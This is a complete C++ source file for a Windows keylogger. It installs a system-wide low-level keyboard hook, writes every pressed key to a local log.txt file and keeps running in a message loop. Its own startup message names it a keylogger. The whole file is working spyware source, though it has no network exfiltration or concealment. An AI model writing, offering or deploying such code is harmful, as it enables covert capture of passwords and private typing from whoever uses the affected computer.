#include <iostream>
#include <windows.h>
#include <fstream>

// Declare the hook handle
HHOOK hHook = NULL;

// File stream for logging
std::ofstream logFile;

// Hook procedure for capturing keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) { // Process only if it's a keyboard event
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) { // Key is pressed
            DWORD vkCode = pKeyboard->vkCode;

            // Open the log file in append mode
            logFile.open("log.txt", std::ios::app);

            if (logFile.is_open()) {
                logFile << (char)vkCode; // Log the key (basic implementation)
                logFile.close();
            }
        }
    }

    // Pass the event to the next hook in the chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Set up the hook
bool SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    if (hHook == NULL) {
        std::cerr << "Failed to install hook! Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

// Remove the hook
void RemoveHook() {
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
    }
}

int main() {
    DWORD pid = GetCurrentProcessId();
    std::cout << "Process ID: " << pid << std::endl;
    // Open the log file to start logging
    logFile.open("log.txt", std::ios::out);

    if (logFile.is_open()) {
        logFile << "Keylogger started...\n";
        logFile.close();
    }

    // Set the keyboard hook
    if (!SetHook()) {
        return -1;
    }
   
    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    RemoveHook();

    return 0;
}
